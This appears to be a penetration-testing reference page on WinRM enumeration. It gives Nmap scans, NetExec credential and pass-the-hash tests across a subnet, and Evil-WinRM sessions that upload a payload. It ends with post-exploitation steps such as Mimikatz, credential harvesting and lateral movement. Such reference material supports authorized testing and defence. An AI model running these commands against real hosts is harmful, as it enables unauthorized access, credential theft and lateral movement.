% Filename: 02-reconnaissance/enum-windows/winrm.md
% Display name: WinRM Enumeration
% Last update: 2026-02-10
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# WinRM Enumeration

## Overview

WinRM (Windows Remote Management) runs on TCP 5985 (HTTP) and TCP 5986 (HTTPS). It is Microsoft's implementation of WS-Management, providing remote shell access and command execution on Windows hosts. WinRM is enabled by default on Windows Server 2012+ and is widely used in enterprise environments for administration. Valid credentials on a host with WinRM enabled grant a full interactive PowerShell session.

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target TCP 5985/5986
- `evil-winrm`, `nxc`, or Nmap installed

## Enumeration Techniques

### Service Detection

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 5985,5986 <target>
```

Expected output:
```text
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0
```

WinRM runs over HTTP(S), so Nmap identifies it as `Microsoft HTTPAPI`. The presence of port 5985/5986 on a Windows host confirms WinRM is enabled.

### Credential Testing with NetExec

```bash
# NetExec
# https://github.com/Pennyw0rth/NetExec
# Test credentials
nxc winrm <target> -u <user> -p <password>

# Test across a subnet
nxc winrm <network>/24 -u <user> -p <password>

# Test with hash (pass-the-hash)
nxc winrm <target> -u <user> -H <NTLM_hash>
```

Expected output:
```text
WINRM    10.10.10.1   5985   WORKSTATION01  [+] CORP\j.smith:Password123 (Pwn3d!)
```

`(Pwn3d!)` means the user has remote management access — a full shell is available. Without `(Pwn3d!)`, the credentials are valid but the user lacks WinRM permissions (not in `Remote Management Users` group or local Administrators).

### Evil-WinRM Connection

```bash
# Evil-WinRM
# https://github.com/Hackplayers/evil-winrm
# Password authentication
evil-winrm -i <target> -u <user> -p <password>

# Hash authentication (pass-the-hash)
evil-winrm -i <target> -u <user> -H <NTLM_hash>

# With SSL (port 5986)
evil-winrm -i <target> -u <user> -p <password> -S

# Upload/download files during session
evil-winrm -i <target> -u <user> -p <password>
*Evil-WinRM* PS > upload /tmp/payload.exe C:\Windows\Temp\payload.exe
*Evil-WinRM* PS > download C:\Users\admin\Desktop\flag.txt /tmp/flag.txt
```

Evil-WinRM provides a full interactive PowerShell session with built-in upload/download, in-memory .NET assembly loading, and DLL injection capabilities.

### WinRM Access Requirements

WinRM access requires the user to be in one of:
- Local `Administrators` group
- Local `Remote Management Users` group
- Domain group with WinRM permissions via GPO

A valid credential that fails WinRM may still work for SMB, RDP, or LDAP — always test across multiple protocols.

### Nmap NSE Scripts

```bash
# Nmap
# https://nmap.org/
# WinRM authentication methods
nmap -p 5985 --script http-auth <target>
```

## Post-Enumeration

With WinRM access confirmed, prioritize:
- Establishing an interactive PowerShell session via Evil-WinRM for further enumeration
- Uploading tools (Mimikatz, SharpHound, Rubeus) for post-exploitation
- Credential harvesting from the host (SAM, LSA secrets, cached credentials)
- Lateral movement to other hosts using discovered credentials
- Testing the same credentials across SMB, RDP, and LDAP if WinRM fails

## References

### Tools

- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [NetExec](https://github.com/Pennyw0rth/NetExec)

### Official Documentation

- [Microsoft WinRM Documentation](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)

### MITRE ATT&CK

- [T1595 - Active Scanning](https://attack.mitre.org/techniques/T1595/)
- [T1021.006 - Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/)
